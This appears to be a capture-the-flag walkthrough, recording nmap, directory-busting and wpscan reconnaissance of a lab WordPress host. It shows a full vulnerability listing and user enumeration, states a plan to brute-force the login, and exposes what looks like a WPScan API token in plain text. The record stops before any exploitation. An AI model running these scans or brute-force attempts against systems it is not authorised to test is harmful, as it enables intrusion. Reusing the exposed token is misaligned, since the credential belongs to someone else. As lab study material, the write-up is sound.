Target: 192.168.236.78

start with the scan of it all. I really only care when it's all done so I turned off verbose mode.

nmap -sV -sC -p- 192.168.236.78 --open -oN sosimple.scan 

Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-05 06:41 EDT                                                    

Nmap scan report for 192.168.236.78                                                                                

Host is up (0.071s latency).                                                                                       

Not shown: 64168 closed tcp ports (conn-refused), 1365 filtered tcp ports (no-response)                            

Some closed ports may be reported as filtered due to --defeat-rst-ratelimit                                        

PORT   STATE SERVICE VERSION                                                                                       

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)                                  

| ssh-hostkey: 

|   3072 5b5543efafd03d0e63207af4ac416a45 (RSA)

|   256 53f5231be9aa8f41e218c6055007d8d4 (ECDSA)

|_  256 55b77b7e0bf54d1bdfc35da1d768a96b (ED25519)

80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))

|_http-title: So Simple

|_http-server-header: Apache/2.4.41 (Ubuntu)

Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  

Check port 80

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

<head>

    <title>So Simple</title>

    <body style="background-color:red;">

<img src="so-simple.png" alt="so simple" width="1900" height="790">

    </body>

</head>

    <!--- Hi, nothing obvious here at the bottom of the source-code, just look further :) --->

![](https://lh6.googleusercontent.com/mkEp6ekKyWdUKzl1mi7EYRy5tZVvCM4GWIZVUI-B206IvINGngTNja4L3ZMbMiscWTdMqOR3j7eaUbkGKbm53NF9UEtHiJnlh0GASpluGY-hqLimKZUOU8hvN-oPdM3gcw=w1280)

I ran both dirb and gobuster with my favorite for memory being dirb since it's easy to remember then go buster for speed

  

dirb http://192.168.236.78/  /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

gobuster dir -u http://192.168.236.78/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

  

Both yielded [http://192.168.236.78/wordpress/](http://192.168.236.78/wordpress/)

Now to scan the wordpress installation via wpscan

  

 →  wpscan http://192.168.236.78/wordpress/                                                                06:54:32

One of the following options is required: --url, --update, --help, --hh, --version

  

Please use --help/-h for the list of available options.

 ⚠   kali  🏡                                                                                                     

 →  wpscan --url http://192.168.236.78/wordpress/                                                          06:54:38

_______________________________________________________________

         __          _______   _____

         \ \        / /  __ \ / ____|

          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®

           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \

            \  /\  /  | |     ____) | (__| (_| | | | |

             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

  

         WordPress Security Scanner by the WPScan Team

                         Version 3.8.22

       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart

_______________________________________________________________

  

[i] Updating the Database ...

[i] Update completed.

  

[+] URL: http://192.168.236.78/wordpress/ [192.168.236.78]

[+] Started: Mon Jun  5 06:54:48 2023

  

Interesting Finding(s):

  

[+] Headers

 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)

 | Found By: Headers (Passive Detection)

 | Confidence: 100%

  

[+] XML-RPC seems to be enabled: http://192.168.236.78/wordpress/xmlrpc.php

 | Found By: Direct Access (Aggressive Detection)

 | Confidence: 100%

 | References:

 |  - http://codex.wordpress.org/XML-RPC_Pingback_API

 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/

 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/

 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/

 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

  

[+] WordPress readme found: http://192.168.236.78/wordpress/readme.html

 | Found By: Direct Access (Aggressive Detection)

 | Confidence: 100%

  

[+] Upload directory has listing enabled: http://192.168.236.78/wordpress/wp-content/uploads/

 | Found By: Direct Access (Aggressive Detection)

 | Confidence: 100%

  

[+] The external WP-Cron seems to be enabled: http://192.168.236.78/wordpress/wp-cron.php

 | Found By: Direct Access (Aggressive Detection)

 | Confidence: 60%

 | References:

 |  - https://www.iplocation.net/defend-wordpress-from-ddos

 |  - https://github.com/wpscanteam/wpscan/issues/1299

  

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).

 | Found By: Rss Generator (Passive Detection)

 |  - http://192.168.236.78/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

 |  - http://192.168.236.78/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

  

[+] WordPress theme in use: twentynineteen

 | Location: http://192.168.236.78/wordpress/wp-content/themes/twentynineteen/

 | Last Updated: 2023-03-29T00:00:00.000Z

 | Readme: http://192.168.236.78/wordpress/wp-content/themes/twentynineteen/readme.txt

 | [!] The version is out of date, the latest version is 2.5

 | Style URL: http://192.168.236.78/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6

 | Style Name: Twenty Nineteen

 | Style URI: https://wordpress.org/themes/twentynineteen/

 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...

 | Author: the WordPress team

 | Author URI: https://wordpress.org/

 |

 | Found By: Css Style In Homepage (Passive Detection)

 |

 | Version: 1.6 (80% confidence)

 | Found By: Style (Passive Detection)

 |  - http://192.168.236.78/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6, Match: 'Version: 1.6'

  

[+] Enumerating All Plugins (via Passive Methods)

[+] Checking Plugin Versions (via Passive and Aggressive Methods)

  

[i] Plugin(s) Identified:

  

[+] simple-cart-solution

 | Location: http://192.168.236.78/wordpress/wp-content/plugins/simple-cart-solution/

 | Last Updated: 2022-04-17T20:50:00.000Z

 | [!] The version is out of date, the latest version is 1.0.2

 |

 | Found By: Urls In Homepage (Passive Detection)

 |

 | Version: 0.2.0 (100% confidence)

 | Found By: Query Parameter (Passive Detection)

 |  - http://192.168.236.78/wordpress/wp-content/plugins/simple-cart-solution/assets/dist/js/public.js?ver=0.2.0

 | Confirmed By:

 |  Readme - Stable Tag (Aggressive Detection)

 |   - http://192.168.236.78/wordpress/wp-content/plugins/simple-cart-solution/readme.txt

 |  Readme - ChangeLog Section (Aggressive Detection)

 |   - http://192.168.236.78/wordpress/wp-content/plugins/simple-cart-solution/readme.txt

  

[+] social-warfare

 | Location: http://192.168.236.78/wordpress/wp-content/plugins/social-warfare/

 | Last Updated: 2023-02-15T16:23:00.000Z

 | [!] The version is out of date, the latest version is 4.4.1

 |

 | Found By: Urls In Homepage (Passive Detection)

 | Confirmed By: Comment (Passive Detection)

 |

 | Version: 3.5.0 (100% confidence)

 | Found By: Comment (Passive Detection)

 |  - http://192.168.236.78/wordpress/, Match: 'Social Warfare v3.5.0'

 | Confirmed By:

 |  Query Parameter (Passive Detection)

 |   - http://192.168.236.78/wordpress/wp-content/plugins/social-warfare/assets/css/style.min.css?ver=3.5.0

 |   - http://192.168.236.78/wordpress/wp-content/plugins/social-warfare/assets/js/script.min.js?ver=3.5.0

 |  Readme - Stable Tag (Aggressive Detection)

 |   - http://192.168.236.78/wordpress/wp-content/plugins/social-warfare/readme.txt

 |  Readme - ChangeLog Section (Aggressive Detection)

 |   - http://192.168.236.78/wordpress/wp-content/plugins/social-warfare/readme.txt

  

[+] Enumerating Config Backups (via Passive and Aggressive Methods)

 Checking Config Backups - Time: 00:00:02 <=====================================> (137 / 137) 100.00% Time: 00:00:02

  

[i] No Config Backups Found.

  

[!] No WPScan API Token given, as a result vulnerability data has not been output.

[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

  

[+] Finished: Mon Jun  5 06:54:57 2023

[+] Requests Done: 190

[+] Cached Requests: 5

[+] Data Sent: 50.604 KB

[+] Data Received: 20.556 MB

[+] Memory used: 269.316 MB

[+] Elapsed time: 00:00:08

  

Apparently I can run it with an API check for vulnerable plugins from the command so I signed up for the free API token

Redoing the command with the plugin detection to save me some searchsploit queries  
  
  
  

wpscan --url http://192.168.236.78/wordpress/ --plugins-detection aggressive --api-token evfnufBAHle2ozuii6T1o2bcxZ59ifBEDOfhroz7RX4

_______________________________________________________________

         __          _______   _____

         \ \        / /  __ \ / ____|

          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®

           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \

            \  /\  /  | |     ____) | (__| (_| | | | |

             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

  

         WordPress Security Scanner by the WPScan Team

                         Version 3.8.22

       Sponsored by Automattic - https://automattic.com/

       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart

_______________________________________________________________

  

[+] URL: http://192.168.236.78/wordpress/ [192.168.236.78]

[+] Started: Mon Jun  5 07:04:41 2023

  

Interesting Finding(s):

  

[+] Headers

 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)

 | Found By: Headers (Passive Detection)

 | Confidence: 100%

  

[+] XML-RPC seems to be enabled: http://192.168.236.78/wordpress/xmlrpc.php

 | Found By: Direct Access (Aggressive Detection)

 | Confidence: 100%

 | References:

 |  - http://codex.wordpress.org/XML-RPC_Pingback_API

 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/

 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/

 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/

 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

  

[+] WordPress readme found: http://192.168.236.78/wordpress/readme.html

 | Found By: Direct Access (Aggressive Detection)

 | Confidence: 100%

  

[+] Upload directory has listing enabled: http://192.168.236.78/wordpress/wp-content/uploads/

 | Found By: Direct Access (Aggressive Detection)

 | Confidence: 100%

  

[+] The external WP-Cron seems to be enabled: http://192.168.236.78/wordpress/wp-cron.php

 | Found By: Direct Access (Aggressive Detection)

 | Confidence: 60%

 | References:

 |  - https://www.iplocation.net/defend-wordpress-from-ddos

 |  - https://github.com/wpscanteam/wpscan/issues/1299

  

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).

 | Found By: Rss Generator (Passive Detection)

 |  - http://192.168.236.78/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

 |  - http://192.168.236.78/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

 |

 | [!] 33 vulnerabilities identified:

 |

 | [!] Title: WordPress 4.7-5.7 - Authenticated Password Protected Pages Exposure

 |     Fixed in: 5.4.5

 |     References:

 |      - https://wpscan.com/vulnerability/6a3ec618-c79e-4b9c-9020-86b157458ac5

 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29450

 |      - https://wordpress.org/news/2021/04/wordpress-5-7-1-security-and-maintenance-release/

 |      - https://blog.wpscan.com/2021/04/15/wordpress-571-security-vulnerability-release.html

 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-pmmh-2f36-wvhq

 |      - https://core.trac.wordpress.org/changeset/50717/

 |      - https://www.youtube.com/watch?v=J2GXmxAdNWs

 |

 | [!] Title: WordPress 3.7 to 5.7.1 - Object Injection in PHPMailer

 |     Fixed in: 5.4.6

 |     References:

 |      - https://wpscan.com/vulnerability/4cd46653-4470-40ff-8aac-318bee2f998d

 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-36326

 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-19296

 |      - https://github.com/WordPress/WordPress/commit/267061c9595fedd321582d14c21ec9e7da2dcf62

 |      - https://wordpress.org/news/2021/05/wordpress-5-7-2-security-release/

 |      - https://github.com/PHPMailer/PHPMailer/commit/e2e07a355ee8ff36aba21d0242c5950c56e4c6f9

 |      - https://www.wordfence.com/blog/2021/05/wordpress-5-7-2-security-release-what-you-need-to-know/

 |      - https://www.youtube.com/watch?v=HaW15aMzBUM

 |

 | [!] Title: WordPress 5.4 to 5.8 -  Lodash Library Update

 |     Fixed in: 5.4.7

 |     References:

 |      - https://wpscan.com/vulnerability/5d6789db-e320-494b-81bb-e678674f4199

 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/

 |      - https://github.com/lodash/lodash/wiki/Changelog

 |      - https://github.com/WordPress/wordpress-develop/commit/fb7ecd92acef6c813c1fde6d9d24a21e02340689

 |

 | [!] Title: WordPress 5.4 to 5.8 - Authenticated XSS in Block Editor

 |     Fixed in: 5.4.7

 |     References:

 |      - https://wpscan.com/vulnerability/5b754676-20f5-4478-8fd3-6bc383145811

 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39201

 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/

 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-wh69-25hr-h94v

 |

 | [!] Title: WordPress 5.4 to 5.8 - Data Exposure via REST API

 |     Fixed in: 5.4.7

 |     References:

 |      - https://wpscan.com/vulnerability/38dd7e87-9a22-48e2-bab1-dc79448ecdfb

 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-39200

 |      - https://wordpress.org/news/2021/09/wordpress-5-8-1-security-and-maintenance-release/

 |      - https://github.com/WordPress/wordpress-develop/commit/ca4765c62c65acb732b574a6761bf5fd84595706

 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-m9hc-7v5q-x8q5

 |

 | [!] Title: WordPress < 5.8.2 - Expired DST Root CA X3 Certificate

 |     Fixed in: 5.4.8

 |     References:

 |      - https://wpscan.com/vulnerability/cc23344a-5c91-414a-91e3-c46db614da8d

 |      - https://wordpress.org/news/2021/11/wordpress-5-8-2-security-and-maintenance-release/

 |      - https://core.trac.wordpress.org/ticket/54207

 |

 | [!] Title: WordPress < 5.8 - Plugin Confusion

 |     Fixed in: 5.8

 |     References:

 |      - https://wpscan.com/vulnerability/95e01006-84e4-4e95-b5d7-68ea7b5aa1a8

 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44223

 |      - https://vavkamil.cz/2021/11/25/wordpress-plugin-confusion-update-can-get-you-pwned/

 |

 | [!] Title: WordPress < 5.8.3 - SQL Injection via WP_Query

 |     Fixed in: 5.4.9

 |     References:

 |      - https://wpscan.com/vulnerability/7f768bcf-ed33-4b22-b432-d1e7f95c1317

 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21661

 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-6676-cqfm-gw84

 |      - https://hackerone.com/reports/1378209

 |

 | [!] Title: WordPress < 5.8.3 - Author+ Stored XSS via Post Slugs

 |     Fixed in: 5.4.9

 |     References:

 |      - https://wpscan.com/vulnerability/dc6f04c2-7bf2-4a07-92b5-dd197e4d94c8

 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21662

 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-699q-3hj9-889w

 |      - https://hackerone.com/reports/425342

 |      - https://blog.sonarsource.com/wordpress-stored-xss-vulnerability

 |

 | [!] Title: WordPress 4.1-5.8.2 - SQL Injection via WP_Meta_Query

 |     Fixed in: 5.4.9

 |     References:

 |      - https://wpscan.com/vulnerability/24462ac4-7959-4575-97aa-a6dcceeae722

 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21664

 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jp3p-gw8h-6x86

 |

 | [!] Title: WordPress < 5.8.3 - Super Admin Object Injection in Multisites

 |     Fixed in: 5.4.9

 |     References:

 |      - https://wpscan.com/vulnerability/008c21ab-3d7e-4d97-b6c3-db9d83f390a7

 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-21663

 |      - https://github.com/WordPress/wordpress-develop/security/advisories/GHSA-jmmq-m8p8-332h

 |      - https://hackerone.com/reports/541469

 |

 | [!] Title: WordPress < 5.9.2 - Prototype Pollution in jQuery

 |     Fixed in: 5.4.10

 |     References:

 |      - https://wpscan.com/vulnerability/1ac912c1-5e29-41ac-8f76-a062de254c09

 |      - https://wordpress.org/news/2022/03/wordpress-5-9-2-security-maintenance-release/

 |

 | [!] Title: WP < 6.0.2 - Reflected Cross-Site Scripting

 |     Fixed in: 5.4.11

 |     References:

 |      - https://wpscan.com/vulnerability/622893b0-c2c4-4ee7-9fa1-4cecef6e36be

 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/

 |

 | [!] Title: WP < 6.0.2 - Authenticated Stored Cross-Site Scripting

 |     Fixed in: 5.4.11

 |     References:

 |      - https://wpscan.com/vulnerability/3b1573d4-06b4-442b-bad5-872753118ee0

 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/

 |

 | [!] Title: WP < 6.0.2 - SQLi via Link API

 |     Fixed in: 5.4.11

 |     References:

 |      - https://wpscan.com/vulnerability/601b0bf9-fed2-4675-aec7-fed3156a022f

 |      - https://wordpress.org/news/2022/08/wordpress-6-0-2-security-and-maintenance-release/

 |

 | [!] Title: WP < 6.0.3 - Stored XSS via wp-mail.php

 |     Fixed in: 5.4.12

 |     References:

 |      - https://wpscan.com/vulnerability/713bdc8b-ab7c-46d7-9847-305344a579c4

 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/

 |      - https://github.com/WordPress/wordpress-develop/commit/abf236fdaf94455e7bc6e30980cf70401003e283

 |

 | [!] Title: WP < 6.0.3 - Open Redirect via wp_nonce_ays

 |     Fixed in: 5.4.12

 |     References:

 |      - https://wpscan.com/vulnerability/926cd097-b36f-4d26-9c51-0dfab11c301b

 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/

 |      - https://github.com/WordPress/wordpress-develop/commit/506eee125953deb658307bb3005417cb83f32095

 |

 | [!] Title: WP < 6.0.3 - Email Address Disclosure via wp-mail.php

 |     Fixed in: 5.4.12

 |     References:

 |      - https://wpscan.com/vulnerability/c5675b59-4b1d-4f64-9876-068e05145431

 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/

 |      - https://github.com/WordPress/wordpress-develop/commit/5fcdee1b4d72f1150b7b762ef5fb39ab288c8d44

 |

 | [!] Title: WP < 6.0.3 - Reflected XSS via SQLi in Media Library

 |     Fixed in: 5.4.12

 |     References:

 |      - https://wpscan.com/vulnerability/cfd8b50d-16aa-4319-9c2d-b227365c2156

 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/

 |      - https://github.com/WordPress/wordpress-develop/commit/8836d4682264e8030067e07f2f953a0f66cb76cc

 |

 | [!] Title: WP < 6.0.3 - CSRF in wp-trackback.php

 |     Fixed in: 5.4.12

 |     References:

 |      - https://wpscan.com/vulnerability/b60a6557-ae78-465c-95bc-a78cf74a6dd0

 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/

 |      - https://github.com/WordPress/wordpress-develop/commit/a4f9ca17fae0b7d97ff807a3c234cf219810fae0

 |

 | [!] Title: WP < 6.0.3 - Stored XSS via the Customizer

 |     Fixed in: 5.4.12

 |     References:

 |      - https://wpscan.com/vulnerability/2787684c-aaef-4171-95b4-ee5048c74218

 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/

 |      - https://github.com/WordPress/wordpress-develop/commit/2ca28e49fc489a9bb3c9c9c0d8907a033fe056ef

 |

 | [!] Title: WP < 6.0.3 - Stored XSS via Comment Editing

 |     Fixed in: 5.4.12

 |     References:

 |      - https://wpscan.com/vulnerability/02d76d8e-9558-41a5-bdb6-3957dc31563b

 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/

 |      - https://github.com/WordPress/wordpress-develop/commit/89c8f7919460c31c0f259453b4ffb63fde9fa955

 |

 | [!] Title: WP < 6.0.3 - Content from Multipart Emails Leaked

 |     Fixed in: 5.4.12

 |     References:

 |      - https://wpscan.com/vulnerability/3f707e05-25f0-4566-88ed-d8d0aff3a872

 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/

 |      - https://github.com/WordPress/wordpress-develop/commit/3765886b4903b319764490d4ad5905bc5c310ef8

 |

 | [!] Title: WP < 6.0.3 - SQLi in WP_Date_Query

 |     Fixed in: 5.4.12

 |     References:

 |      - https://wpscan.com/vulnerability/1da03338-557f-4cb6-9a65-3379df4cce47

 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/

 |      - https://github.com/WordPress/wordpress-develop/commit/d815d2e8b2a7c2be6694b49276ba3eee5166c21f

 |

 | [!] Title: WP < 6.0.3 - Stored XSS via RSS Widget

 |     Fixed in: 5.4.12

 |     References:

 |      - https://wpscan.com/vulnerability/58d131f5-f376-4679-b604-2b888de71c5b

 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/

 |      - https://github.com/WordPress/wordpress-develop/commit/929cf3cb9580636f1ae3fe944b8faf8cca420492

 |

 | [!] Title: WP < 6.0.3 - Data Exposure via REST Terms/Tags Endpoint

 |     Fixed in: 5.4.12

 |     References:

 |      - https://wpscan.com/vulnerability/b27a8711-a0c0-4996-bd6a-01734702913e

 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/

 |      - https://github.com/WordPress/wordpress-develop/commit/ebaac57a9ac0174485c65de3d32ea56de2330d8e

 |

 | [!] Title: WP < 6.0.3 - Multiple Stored XSS via Gutenberg

 |     Fixed in: 5.4.12

 |     References:

 |      - https://wpscan.com/vulnerability/f513c8f6-2e1c-45ae-8a58-36b6518e2aa9

 |      - https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/

 |      - https://github.com/WordPress/gutenberg/pull/45045/files

 |

 | [!] Title: WP <= 6.2 - Unauthenticated Blind SSRF via DNS Rebinding

 |     References:

 |      - https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11

 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590

 |      - https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/

 |

 | [!] Title: WP < 6.2.1 - Directory Traversal via Translation Files

 |     Fixed in: 5.4.13

 |     References:

 |      - https://wpscan.com/vulnerability/2999613a-b8c8-4ec0-9164-5dfe63adf6e6

 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-2745

 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/

 |

 | [!] Title: WP < 6.2.1 - Thumbnail Image Update via CSRF

 |     Fixed in: 5.4.13

 |     References:

 |      - https://wpscan.com/vulnerability/a03d744a-9839-4167-a356-3e7da0f1d532

 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/

 |

 | [!] Title: WP < 6.2.1 - Contributor+ Stored XSS via Open Embed Auto Discovery

 |     Fixed in: 5.4.13

 |     References:

 |      - https://wpscan.com/vulnerability/3b574451-2852-4789-bc19-d5cc39948db5

 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/

 |

 | [!] Title: WP < 6.2.2 - Shortcode Execution in User Generated Data

 |     Fixed in: 5.4.13

 |     References:

 |      - https://wpscan.com/vulnerability/ef289d46-ea83-4fa5-b003-0352c690fd89

 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/

 |      - https://wordpress.org/news/2023/05/wordpress-6-2-2-security-release/

 |

 | [!] Title: WP < 6.2.1 - Contributor+ Content Injection

 |     Fixed in: 5.4.13

 |     References:

 |      - https://wpscan.com/vulnerability/1527ebdb-18bc-4f9d-9c20-8d729a628670

 |      - https://wordpress.org/news/2023/05/wordpress-6-2-1-maintenance-security-release/

  

[+] WordPress theme in use: twentynineteen

 | Location: http://192.168.236.78/wordpress/wp-content/themes/twentynineteen/

 | Last Updated: 2023-03-29T00:00:00.000Z

 | Readme: http://192.168.236.78/wordpress/wp-content/themes/twentynineteen/readme.txt

 | [!] The version is out of date, the latest version is 2.5

 | Style URL: http://192.168.236.78/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6

 | Style Name: Twenty Nineteen

 | Style URI: https://wordpress.org/themes/twentynineteen/

 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...

 | Author: the WordPress team

 | Author URI: https://wordpress.org/

 |

 | Found By: Css Style In Homepage (Passive Detection)

 |

 | Version: 1.6 (80% confidence)

 | Found By: Style (Passive Detection)

 |  - http://192.168.236.78/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6, Match: 'Version: 1.6'

  

[+] Enumerating All Plugins (via Aggressive Methods)

  

So tmi on vulnerabilities. I only need one or to login to wp-admin. Will look for potential users and try a basic rockyou bruteforce.

The useful command without TMI

  

 →  wpscan --url http://192.168.236.78/wordpress/ --enumerate                                              07:11:43

_______________________________________________________________

         __          _______   _____

         \ \        / /  __ \ / ____|

          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®

           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \

            \  /\  /  | |     ____) | (__| (_| | | | |

             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

  

         WordPress Security Scanner by the WPScan Team

                         Version 3.8.22

       Sponsored by Automattic - https://automattic.com/

       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart

_______________________________________________________________

  

[+] URL: http://192.168.236.78/wordpress/ [192.168.236.78]

[+] Started: Mon Jun  5 07:12:07 2023

  

Interesting Finding(s):

  

[+] Headers

 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)

 | Found By: Headers (Passive Detection)

 | Confidence: 100%

  

[+] XML-RPC seems to be enabled: http://192.168.236.78/wordpress/xmlrpc.php

 | Found By: Direct Access (Aggressive Detection)

 | Confidence: 100%

 | References:

 |  - http://codex.wordpress.org/XML-RPC_Pingback_API

 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/

 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/

 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/

 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

  

[+] WordPress readme found: http://192.168.236.78/wordpress/readme.html

 | Found By: Direct Access (Aggressive Detection)

 | Confidence: 100%

  

[+] Upload directory has listing enabled: http://192.168.236.78/wordpress/wp-content/uploads/

 | Found By: Direct Access (Aggressive Detection)

 | Confidence: 100%

  

[+] The external WP-Cron seems to be enabled: http://192.168.236.78/wordpress/wp-cron.php

 | Found By: Direct Access (Aggressive Detection)

 | Confidence: 60%

 | References:

 |  - https://www.iplocation.net/defend-wordpress-from-ddos

 |  - https://github.com/wpscanteam/wpscan/issues/1299

  

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).

 | Found By: Rss Generator (Passive Detection)

 |  - http://192.168.236.78/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

 |  - http://192.168.236.78/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

  

[+] WordPress theme in use: twentynineteen

 | Location: http://192.168.236.78/wordpress/wp-content/themes/twentynineteen/

 | Last Updated: 2023-03-29T00:00:00.000Z

 | Readme: http://192.168.236.78/wordpress/wp-content/themes/twentynineteen/readme.txt

 | [!] The version is out of date, the latest version is 2.5

 | Style URL: http://192.168.236.78/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6

 | Style Name: Twenty Nineteen

 | Style URI: https://wordpress.org/themes/twentynineteen/

 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...

 | Author: the WordPress team

 | Author URI: https://wordpress.org/

 |

 | Found By: Css Style In Homepage (Passive Detection)

 |

 | Version: 1.6 (80% confidence)

 | Found By: Style (Passive Detection)

 |  - http://192.168.236.78/wordpress/wp-content/themes/twentynineteen/style.css?ver=1.6, Match: 'Version: 1.6'

  

[+] Enumerating Vulnerable Plugins (via Passive Methods)

[+] Checking Plugin Versions (via Passive and Aggressive Methods)

  

[i] No plugins Found.

  

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)

 Checking Known Locations - Time: 00:00:07 <====================================> (500 / 500) 100.00% Time: 00:00:07

[+] Checking Theme Versions (via Passive and Aggressive Methods)

  

[i] No themes Found.

  

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)

 Checking Known Locations - Time: 00:00:41 <==================================> (2575 / 2575) 100.00% Time: 00:00:41

  

[i] No Timthumbs Found.

  

[+] Enumerating Config Backups (via Passive and Aggressive Methods)

 Checking Config Backups - Time: 00:00:02 <=====================================> (137 / 137) 100.00% Time: 00:00:02

  

[i] No Config Backups Found.

  

[+] Enumerating DB Exports (via Passive and Aggressive Methods)

 Checking DB Exports - Time: 00:00:01 <===========================================> (71 / 71) 100.00% Time: 00:00:01

  

[i] No DB Exports Found.

  

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)

 Brute Forcing Attachment IDs - Time: 00:00:02 <================================> (100 / 100) 100.00% Time: 00:00:02

  

[i] No Medias Found.

  

[+] Enumerating Users (via Passive and Aggressive Methods)

 Brute Forcing Author IDs - Time: 00:00:00 <======================================> (10 / 10) 100.00% Time: 00:00:00

  

[i] User(s) Identified:

  

[+] admin

 | Found By: Author Posts - Author Pattern (Passive Detection)

 | Confirmed By:

 |  Rss Generator (Passive Detection)

 |  Wp Json Api (Aggressive Detection)

 |   - http://192.168.236.78/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1

 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

 |  Login Error Messages (Aggressive Detection)

  

[+] max

 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
